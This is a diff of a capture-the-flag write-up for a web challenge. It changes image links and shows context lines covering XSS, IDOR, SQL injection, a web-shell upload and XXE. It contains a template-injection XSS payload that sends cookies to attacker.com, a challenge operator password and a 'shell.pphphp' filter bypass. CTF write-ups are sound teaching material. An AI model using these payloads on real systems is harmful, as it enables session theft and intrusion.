@@ -10,7 +10,7 @@ I hope that to solve it in any case was interesting and glad that many attempted
 Firstly, we can see a main page. In the browser console, we can see the name of the Vue.js framework used to chat with the operator.
 Secondly, in source code we can see injection point, there is the customer name, which is specified at registration.
 
-![XSS in name parameter](https://github.com/adam-p/markdown-here/raw/master/src/common/images/icon48.png "XSS in name")
+![XSS in name parameter](screenshots/xss_stage.png "XSS in name")
 
 This XXS will work on the operator page. 
 Final attack vector for stealing Operator info:
@@ -27,7 +27,7 @@ Ok) We can see non http only cookie - *userId*. This is IDOR. We can steal opera
 
 ```${toString.constructor('document.location = "http://attacker.com/?"+document.cookie')()}```
 
-![IDOR in userId](https://github.com/adam-p/markdown-here/raw/master/src/common/images/icon48.png "IDOR exploitation")
+![IDOR in userId](screenshots/IDOR.png "IDOR exploitation")
 
 Login as Operator:
 
@@ -37,7 +37,7 @@ Password: Floise_default_@@@f
 
 ## Stage 2 - SQL Injection
 
-![Operator's page](https://github.com/adam-p/markdown-here/raw/master/src/common/images/icon48.png "Operator's page")
+![Operator's page](screenshots/Operators_page.png "Operator's page")
 
 Here we can see operator's page. The operator has three additional methods:
 
@@ -87,7 +87,7 @@ We have simple bypass like: *shell.pphphp*
 
 When we upload a file, we obtain the generated random name for it. 
 
-![Shell ulpoad](https://github.com/adam-p/markdown-here/raw/master/src/common/images/icon48.png "Shell ulpoad")
+![Shell ulpoad](screenshots/upload_shell.png "Shell ulpoad")
 
 But where is our shell? Let's read source code of site. We have the ability to save product info in XML format. Maybe XXE? YES!
 
